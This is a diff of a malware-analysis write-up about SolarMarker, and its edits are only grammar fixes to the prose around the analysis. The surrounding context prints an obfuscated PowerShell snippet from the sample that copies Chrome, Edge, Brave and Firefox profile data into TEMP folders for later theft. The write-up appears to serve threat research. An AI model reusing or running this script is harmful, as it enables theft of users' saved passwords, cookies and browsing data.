@@ -28,10 +28,10 @@ The variants I came across seems to be two variants, so most "likely" an update 
 
 Both did have the marker: solarmarker.dat
 
-When decoded the DLL that would have been loaded in memory will be detected as (for example):  Win.Dropper.SolarMarker-9867952-0
+When decoded, the DLL's that would have been loaded in memory will be detected as (for example):  Win.Dropper.SolarMarker-9867952-0
 
 - One "fun" part of a script "dropped" in conjunction contained the following:
 
 $a0f0c03382c4efb8310e13dbcf82f=$ENV:LOcalappDaTA+'\GoOgLe\CHROmE\uSER DATa';iF(TesT-PATh ($a0f0c03382c4efb8310e13dbcf82f)) {cOpY-ItEM -PatH $a0f0c03382c4efb8310e13dbcf82f -desTinatIOn ($env:TEMP+'\CHrprF_BKp') -RECURSE -eRROrActION siLeNTlYCONTInUe -errORVarIABLe ErroRS}$af6755e57a445487e3087a091dce5=$eNV:LocalApPdata+'\MiCRosOFT\eDge\user data';iF(tesT-PaTh ($af6755e57a445487e3087a091dce5)) {COpY-iteM -paTh $af6755e57a445487e3087a091dce5 -DesTiNaTioN ($Env:tEMP+'\EDGPrf_BkP') -REcURSE -ErRORaction SilenTLycONTinUe -ERrORVARiABle eRrORs}$a41a0546fef4f191c015ef2d56860=$ENV:LoCALaPPDATa+'\bRAvEsOftwArE\BraVE-bROwSeR\usER DAta';iF(teSt-path ($a41a0546fef4f191c015ef2d56860)) {COPY-ITeM -PAth $a41a0546fef4f191c015ef2d56860 -DesTinatION ($EnV:temP+'\bRvPRF_bkP') -recURse -eRRorACTiON sileNtLyConTINue -errOrvariaBLe errORS}$a8ba793089d45dbb43fa9a532f2cf=$EnV:aPPDatA+'\mozIlLa\FirefOX\PROFIleS';iF(TEst-pATh ($a8ba793089d45dbb43fa9a532f2cf)) {gEt-cHIldiTeM $a8ba793089d45dbb43fa9a532f2cf -dIrECTorY|wHerE-oBJECT {(GeT-CHILdIteM $_.FUlLNamE -filteR '*.SQlite').CoUNt -gt 0}|forEaCh-ObjECT{CoPY-ItEm -paTH $_.FULLname -DesTiNATiOn ($eNv:TeMP+'\fFxprf_BKp') -ReCuRsE -errOrActIon SIlENtlYCONTinuE -errOrvaRiAble ErrOrs}}StArT-JoB
 
-It was actually several scripts dropped in conjunction, the difference being that where XOR:ed either "3" or "185" as the key as a different for the maRs.deImoS scripts.
+It was actually several scripts dropped in conjunction, the difference being that these where XOR:ed with either "3" or "185" as the key, which set them aside from the maRs.deImoS scripts.
